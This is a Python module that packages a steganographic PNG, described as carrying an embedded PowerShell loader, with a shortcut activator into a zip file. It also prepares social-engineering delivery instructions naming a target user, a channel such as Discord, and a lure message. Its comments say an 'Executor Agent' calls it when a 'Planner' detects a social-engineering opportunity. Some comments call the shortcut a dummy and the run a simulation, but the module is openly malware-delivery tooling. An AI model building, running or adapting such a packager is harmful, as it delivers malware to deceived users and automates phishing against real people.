# -*- coding: utf-8 -*-
"""
Steganography Payload Packager

Creates a .zip package containing:
1. A steganographic image (.png) with an embedded PowerShell loader.
2. A shortcut file (.lnk) to activate the payload.

This module is designed to be called by the Executor Agent when the Planner
detects a social engineering opportunity.
"""

import os
import zipfile
import random
from config import PAYLOAD_CONFIG, LOG_DIR


def create_stego_package(delivery_channel: str, target_user: str, message_template: str) -> str:
    """
    Creates a steganography payload package (.zip) and returns the path to the file.

    Args:
        delivery_channel (str): The intended delivery channel (e.g., 'Discord').
        target_user (str): The target user or channel (e.g., 'general_chat').
        message_template (str): The social engineering message to use.

    Returns:
        str: The absolute path to the created .zip package, or an empty string on failure.
    """
    print(f"[StegoBuilder] Creating stego package for {delivery_channel} -> {target_user}")

    stego_images_dir = PAYLOAD_CONFIG.get("STEGO_IMAGES_DIR")
    stego_loaders_dir = PAYLOAD_CONFIG.get("STEGO_LOADERS_DIR")
    output_dir = os.path.join(LOG_DIR, "stego_packages")

    # 1. Validate paths and select random payloads
    if not os.path.exists(stego_images_dir) or not os.listdir(stego_images_dir):
        print(f"[StegoBuilder] Error: Stego images directory is empty or not found at {stego_images_dir}")
        return ""
    if not os.path.exists(stego_loaders_dir) or not os.listdir(stego_loaders_dir):
        print(f"[StegoBuilder] Error: Stego loaders directory is empty or not found at {stego_loaders_dir}")
        return ""

    try:
        os.makedirs(output_dir, exist_ok=True)

        selected_image = random.choice(os.listdir(stego_images_dir))
        selected_loader = random.choice(os.listdir(stego_loaders_dir))

        image_path = os.path.join(stego_images_dir, selected_image)
        loader_path = os.path.join(stego_loaders_dir, selected_loader)

        # For this simulation, we assume the .lnk file is pre-generated and corresponds to the loader.
        # In a real scenario, this step would dynamically create the .lnk file.
        lnk_filename = os.path.splitext(selected_image)[0] + ".lnk"
        lnk_path = os.path.join(output_dir, lnk_filename) # Placeholder

        # 2. Create a dummy .lnk file for packaging simulation
        with open(lnk_path, 'w') as f:
            f.write(f"[InternetShortcut]\nURL=file:///{loader_path}")
        print(f"[StegoBuilder] Generated dummy activator: {lnk_filename}")

        # 3. Create the .zip package
        zip_filename = f"StegoPackage_{os.path.splitext(selected_image)[0]}.zip"
        zip_filepath = os.path.join(output_dir, zip_filename)

        with zipfile.ZipFile(zip_filepath, 'w') as zf:
            zf.write(image_path, arcname=selected_image)
            zf.write(lnk_path, arcname=lnk_filename)
        
        print(f"[StegoBuilder] Successfully created stego package: {zip_filepath}")
        
        # 4. Prepare delivery instructions
        delivery_instructions = {
            "package_path": zip_filepath,
            "channel": delivery_channel,
            "target": target_user,
            "message": message_template
        }
        print(f"[StegoBuilder] Delivery instructions prepared for Operator: {delivery_instructions}")

        return zip_filepath

    except Exception as e:
        print(f"[StegoBuilder] Error creating stego package: {e}")
        return ""

